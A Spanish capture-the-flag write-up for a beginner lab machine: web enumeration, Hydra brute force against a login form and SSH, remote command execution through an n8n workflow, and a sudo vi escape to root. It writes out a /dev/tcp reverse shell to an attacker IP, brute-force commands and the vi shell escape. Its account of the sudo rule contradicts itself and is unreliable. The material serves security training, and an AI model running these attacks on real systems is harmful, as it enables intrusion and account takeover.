# NodeCeption

**Plataforma:** The Hackers Labs
**Dificultad:** Principiante
**OS:** Linux (Ubuntu)
**Fecha:** 25/07/2026

## 0. Resumen

Máquina Linux de dificultad para principiantes con temática de entorno corporativo, que expone un servicio de automatización (n8n) mal protegido.

El camino de explotación combina:
- Enumeración web para localizar credenciales filtradas en el código fuente de la página
- Fuerza bruta contra un panel de login personalizado, aplicando un diccionario filtrado según la política de contraseñas detectada
- Abuso de un workflow de n8n para lograr ejecución remota de comandos (RCE) y obtener una shell inicial
- Escalada a root aprovechando un permiso sudo mal configurado sobre `vi`, tras obtener la contraseña del usuario del sistema por fuerza bruta SSH

## 1. Reconocimiento

Ping

```bash
ping -c 2 <IP>
```

→ TTL sugiere host Linux

Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA nodeception
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` | Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.nmap, .xml, .gnmap) |

**Resultados:**

- Puerto 22: OpenSSH (Ubuntu)
- Puerto 5678: servicio propio de **n8n** (plataforma de automatización de workflows), no identificado por defecto por nmap
- Puerto 8765: Apache, sirviendo la página por defecto de Apache2

→ La combinación de un panel Apache "de relleno" junto a un puerto de automatización expuesto directamente ya apunta a que el vector de entrada real está en n8n, y que el 8765 probablemente esconde alguna pista para llegar hasta ahí

## 2. Enumeración web

### 2.1 Revisión del código fuente en el puerto 8765

La página que responde en el puerto 8765 muestra el index por defecto de Apache, sin contenido aparente a simple vista. Sin embargo, al inspeccionar el HTML servido aparece un comentario dejado por el desarrollador con:

- Una dirección de correo que actúa como identificador de usuario válido en el sistema
- La política de contraseñas exigida por la aplicación (longitud mínima de 8 caracteres, al menos una mayúscula y un número)

→ Esta filtración es el punto de partida real de la máquina: sin ella, tanto el usuario como el ataque de fuerza bruta posterior no serían viables en un tiempo razonable

### 2.2 Fuzzing de directorios

```bash
gobuster dir -u http://<IP>:8765/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

| Orden | Función |
|---|---|
| `-u` | URL objetivo |
| `-w` | Diccionario de rutas |
| `-x` | Extensiones de archivo a probar |

→ El fuzzing revela `login.php`, un formulario de autenticación por correo y contraseña que no estaba enlazado desde ningún sitio visible

## 3. Acceso inicial — Fuerza bruta sobre el panel web

### 3.1 Filtrado del diccionario según la política de contraseñas

Aplicar `rockyou.txt` directamente sería poco eficiente teniendo en cuenta la política detectada, así que primero se reduce el diccionario a las entradas que cumplen los requisitos mínimos:

```bash
grep -P '^.{8,}$' /usr/share/wordlists/rockyou.txt | grep '[0-9]' | grep '[A-Z]' > rockyou_filtrado.txt
```

→ Esto reduce drásticamente el número de intentos necesarios y agiliza el ataque frente a un formulario que puede tener límites de peticiones

### 3.2 Ataque contra login.php

```bash
hydra -l usuario@correo.com -P rockyou_filtrado.txt <IP> http-post-form "/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas" -s 8765
```

| Orden | Función |
|---|---|
| `-l` | Usuario fijo (correo detectado en el HTML) |
| `-P` | Diccionario ya filtrado por política de contraseñas |
| `http-post-form` | Módulo de Hydra para formularios POST |
| `F=` | Cadena que identifica un intento fallido |
| `-s` | Puerto del servicio |

→ Credenciales válidas obtenidas para el correo detectado; el panel confirma el acceso correcto

### 3.3 Reutilización de credenciales en n8n

El mismo par de credenciales funciona directamente contra la instancia de **n8n** expuesta en el puerto 5678, señal de que ambos servicios comparten la misma base de usuarios o que simplemente se ha reutilizado la contraseña entre aplicaciones

## 4. Explotación — RCE vía n8n

### 4.1 ¿Por qué n8n permite ejecución de comandos?

n8n es una herramienta de automatización de workflows (similar a Zapier o Node-RED) que permite encadenar nodos de distintos tipos, entre ellos un nodo de tipo **Execute Command**, pensado para tareas de administración pero que, en manos de cualquier usuario autenticado, se convierte en una vía directa de ejecución de comandos sobre el host donde corre n8n

### 4.2 Creación del workflow malicioso

Desde la interfaz web se crea un nuevo workflow y se añade un nodo de ejecución de comandos, configurado para lanzar una reverse shell hacia un listener propio, por ejemplo:

```bash
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'
```

Se levanta el listener antes de ejecutar el workflow:

```bash
nc -nlvp 4444
```

Al ejecutar el workflow desde n8n, el nodo lanza el comando en el servidor y la conexión llega al listener

→ Shell inicial obtenida como el usuario de sistema que ejecuta el servicio n8n (en este caso, un usuario no privilegiado propio de la máquina)

### 4.3 Mejora de la shell

```bash
script -qc /bin/bash /dev/null
# Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

→ Shell semi-interactiva, más cómoda para la fase de post-explotación

## 5. Reconocimiento post-explotación

### 5.1 Primera flag

```bash
cat ~/user.txt
```

### 5.2 Enumeración de privilegios sudo

```bash
sudo -l
```

→ El usuario comprometido puede ejecutar `/usr/bin/vi` sin contraseña, pero el `(ALL : ALL)` genérico que también aparece sí la requiere, por lo que la vía de `vi` sin contraseña resulta interesante pero limitada mientras no se disponga de esa clave

### 5.3 Primer intento de escalada — GTFOBins

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

→ El intento falla porque, aunque `vi` aparece permitido, la política de sudo configurada exige contraseña para completar la ejecución; es necesario obtener antes las credenciales del propio usuario del sistema

## 6. Escalada a root

### 6.1 Fuerza bruta SSH contra el usuario del sistema

```bash
hydra -l <usuario_sistema> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

→ Un diccionario básico es suficiente para obtener la contraseña de este usuario, reflejo de una política de contraseñas débil a nivel de sistema operativo (independiente de la política más estricta aplicada en la capa web)

### 6.2 Explotación definitiva vía GTFOBins

Con la contraseña ya disponible, se repite la técnica de GTFOBins para `vi`, esta vez proporcionando la contraseña cuando `sudo` la solicita:

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

| Instrucción | Función |
|---|---|
| `-c ':!/bin/sh'` | Ejecuta un comando de shell externo desde dentro de `vi`, heredando los privilegios con los que se invocó `vi` |

→ Al ejecutarse `vi` mediante `sudo`, el shell invocado desde dentro hereda privilegios de root

### 6.3 Flag final

```bash
cat /root/root.txt
```

## 7. Lecciones aprendidas

- **Fuga de información en comentarios HTML:** dejar credenciales, correos o políticas de contraseñas en el código fuente de una página, aunque parezca "de relleno" o de prueba, proporciona a un atacante justo lo necesario para dirigir un ataque de fuerza bruta con precisión
  
- **Reutilización de contraseñas entre servicios:** el mismo par de credenciales válido en el panel web lo era también en n8n, mostrando cómo un solo fallo de higiene de credenciales puede comprometer varios servicios a la vez

- **Herramientas de automatización como superficie de ataque:** funcionalidades legítimas de administración como los nodos "Execute Command" en n8n, si quedan accesibles a cualquier usuario autenticado sin control adicional, equivalen a una puerta de ejecución remota de comandos sobre el servidor

- **Configuraciones de sudo mal calibradas:** permitir `vi` sin contraseña bajo una política de sudo, aun cuando el resto de reglas exijan autenticación, es arriesgado porque GTFOBins documenta cómo escapar de editores como `vi` para lanzar una shell heredando el nivel de privilegio con el que se invocó; conviene restringir editores en `sudoers` o usar `NOEXEC`/wrappers específicos en lugar de binarios genéricos

- **Contraseñas débiles a nivel de sistema:** aunque la capa web exigiera una política de contraseñas robusta, la cuenta del sistema operativo cayó ante un diccionario básico, recordando que la seguridad de una máquina depende de que todas sus capas (web, SSH, servicios internos) mantengan el mismo nivel de exigencia
